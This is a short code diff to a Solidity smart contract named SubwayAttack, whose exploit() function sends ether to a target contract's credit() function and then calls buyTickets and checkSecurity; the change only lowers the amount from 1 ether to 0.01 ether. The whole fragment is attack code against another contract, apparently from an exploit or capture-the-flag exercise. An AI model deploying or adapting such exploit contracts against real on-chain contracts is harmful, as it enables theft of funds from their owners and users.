@@ -13,8 +13,8 @@ contract SubwayAttack {
     }
 
     function exploit() public payable {
-        require (msg.value == 1 ether);
-        address(originalContract).call.value(1 ether)(abi.encodeWithSignature("credit()"));
+        require (msg.value == 0.01 ether);
+        address(originalContract).call.value(0.01 ether)(abi.encodeWithSignature("credit()"));
         originalContract.buyTickets(1);
         originalContract.checkSecurity();
     }
